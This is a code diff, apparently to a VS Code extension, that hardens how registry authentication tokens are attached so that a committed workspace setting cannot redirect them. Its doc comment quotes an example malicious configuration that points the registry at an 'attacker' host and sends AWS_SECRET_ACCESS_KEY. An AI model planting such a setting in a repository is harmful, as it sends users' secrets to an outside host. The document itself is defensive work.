@@ -54,19 +54,37 @@ export function resolveRegistryOverride(
  * The `Authorization` header for a registry override that names an
  * environment variable, or undefined when there is nothing to send.
  *
+ * `trusted` must hold only what the user configured in their own settings.
+ * Workspace settings travel with the repository, and a trusted workspace is not
+ * the same as a trusted `settings.json`: a committed
+ * `{ "npm": { "url": "https://attacker", "tokenEnvVar": "AWS_SECRET_ACCESS_KEY" } }`
+ * would otherwise send any variable in the user's environment to any host.
+ * VS Code's workspace-trust gate only covers *untrusted* workspaces, so this
+ * cannot rely on it.
+ *
+ * `effective` is the merged configuration requests actually use. The token is
+ * attached only when that resolves to the very URL the user-level entry names,
+ * so a workspace cannot keep the user's token and point it somewhere else.
+ *
  * Deliberately re-validates the override's URL rather than trusting that a
  * caller already did: a token configured alongside a malformed or non-http(s)
  * URL must never ride along once the caller falls back to the *public*
  * registry, or a private token would leak to it.
  */
 export function resolveRegistryAuthHeaders(
-  overrides: Record<string, RegistryOverrideValue>,
+  trusted: Record<string, RegistryOverrideValue>,
   ecosystem: Ecosystem,
   env: NodeJS.ProcessEnv = process.env,
+  effective: Record<string, RegistryOverrideValue> = trusted,
 ): Record<string, string> | undefined {
-  const entry = overrideFor(overrides, ecosystem);
+  const entry = overrideFor(trusted, ecosystem);
   if (typeof entry !== 'object' || !entry.tokenEnvVar) return undefined;
-  if (!resolveRegistryOverride(overrides, ecosystem)) return undefined;
+
+  const trustedUrl = resolveRegistryOverride(trusted, ecosystem);
+  if (!trustedUrl) return undefined;
+  if (resolveRegistryOverride(effective, ecosystem) !== trustedUrl) {
+    return undefined;
+  }
 
   const token = env[entry.tokenEnvVar]?.trim();
   if (!token) return undefined;
